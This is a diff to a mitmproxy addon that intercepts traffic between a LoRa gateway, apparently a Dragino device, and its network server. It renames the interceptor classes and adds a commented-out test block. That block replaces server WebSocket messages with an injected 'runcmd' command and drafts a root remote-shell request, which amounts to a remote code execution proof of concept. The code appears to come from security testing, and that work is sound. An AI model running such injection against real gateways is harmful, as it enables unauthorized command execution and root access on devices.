@@ -3,7 +3,7 @@ import time
 from mitmproxy import http, ctx
 import os
 
-class Logger:
+class LNSInterceptor:
     root = '/home/mitmproxy'
 
     def __init__(self):
@@ -11,8 +11,6 @@ class Logger:
             # export paths
             self.requests_file_path = f'{self.root}/requests.json'
             self.wss_messages_file_path = f'{self.root}/wss_messages.json'
-
-
 
             # init files if don't exist
             self.init_file(self.requests_file_path)
@@ -23,7 +21,7 @@ class Logger:
             self.wss_messages_file = open(self.wss_messages_file_path, 'r+')
 
         except Exception as e:
-            ctx.log.info(f"[{self.timestamp_now()}] Error during Logger initialization: {e}")
+            ctx.log.info(f"[{self.timestamp_now()}] Error during LNSInterceptor initialization: {e}")
 
     def timestamp_now(self):
      return time.strftime('%Y-%m-%d %H:%M:%S', time.localtime())
@@ -76,6 +74,7 @@ class Logger:
         if flow.websocket is not None:
             timestamp = self.timestamp_now()
             message = flow.websocket.messages[-1]
+            
             try:
                 content = json.loads(message.content)
             except json.JSONDecodeError:
@@ -93,13 +92,44 @@ class Logger:
             self.append_to_file(self.wss_messages_file, message_info)
 
             ctx.log.info(f"[{timestamp}] Logged WebSocket message from {'client' if message.from_client else 'server'}")
+            
+            # !! this section should be removed after test
+
+            # !! test0 -> https://doc.sm.tc/station/tcproto.html#remote-commands
+            """  
+           if message.from_client == False:
+               
+                message.drop()
+                #run_cmd = {"msgtype": "runcmd", "command": "mkdir /tmp/RCE_SUCCESS", "arguments": []}
+                run_cmd= {"msgtype": "runcmd", "command": "mkdir", "arguments": ["/tmp/RCE_SUCCESS_2"]}
+                rmt_sh = {
+                    "msgtype": "rmtsh",
+                    "user": "root",
+                    "term": "xterm-256color",
+                    "start":1,
+                    #"stop":0
+                }
+
+                command_bytes = json.dumps(run_cmd).encode('utf-8')
+                
+                # hope this works
+
+                message.content = command_bytes
+                
+
+                # Replace the content with the new command
+                ctx.log.info(f"[{timestamp}] Try to run command on dragino")
+            else:
+                ctx.log.info("Command abort as it comes from client") 
+            """
+
 
     # on obj destruct kill the filestream
     def __del__(self):
         self.requests_file.close()
         self.wss_messages_file.close()
 
-class RCEInterceptor:
+class CUPSInterceptor:
 
     ca_cert_path = '/home/mitmproxy/mitmproxy-ca-cert.pem'
 
@@ -127,6 +157,7 @@ class RCEInterceptor:
     # remove root certif if present in https response
     def response(self, flow: http.HTTPFlow):
         timestamp = self.timestamp_now()
+
         try:
             if 'content-type' in flow.response.headers:
                 if flow.response.headers['content-type'] == 'application/octet-stream':
@@ -139,4 +170,4 @@ class RCEInterceptor:
             ctx.log.info(f"[{timestamp}] Error processing HTTP response: {e}")
 
 # add the current logger as new addon on mitmproxy
-addons = [Logger(), RCEInterceptor()]
+addons = [LNSInterceptor(), CUPSInterceptor()]
